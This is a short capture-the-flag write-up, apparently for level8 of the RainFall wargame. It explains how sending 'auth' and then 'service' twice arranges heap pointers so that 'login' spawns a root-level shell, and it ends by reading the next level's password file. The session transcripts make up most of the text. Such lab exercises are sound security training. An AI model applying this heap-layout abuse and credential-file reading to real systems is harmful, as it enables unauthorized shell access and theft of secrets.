We can see on [dogbolt](https://dogbolt.org/), the program ``level8`` as cut in three part : <br>
``'auth '``, ``service`` and ``login`` and we are intrested by ``login`` because there are the function system('/bin/sh')

we can notice, the condition for acceed to /bin/sh are the pointer auth + 0x20 are not null
and we can see also ``'auth '`` initialize auth

and we test the program who print any command auth pointer and service pointer 
```bash
level8@RainFall:~$ ./level8 
> (nil), (nil) 
auth 
> 0x804a008, (nil) 
service
> 0x804a008, 0x804a018
login
Password:
> 0x804a008, 0x804a018
auth 
> 0x804a018, 0x804a018
service
> 0x804a018, 0x804a028
```

we deducted in the repeat of condition the service or auth pointer increment to 0x10 also we need to have 
``pointer, pointer+0x20``

```bash
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth 
0x804a008, (nil) 
service
0x804a008, 0x804a018 
service
0x804a008, 0x804a028 
login
$
$ cat /home/user/level9/.pass
```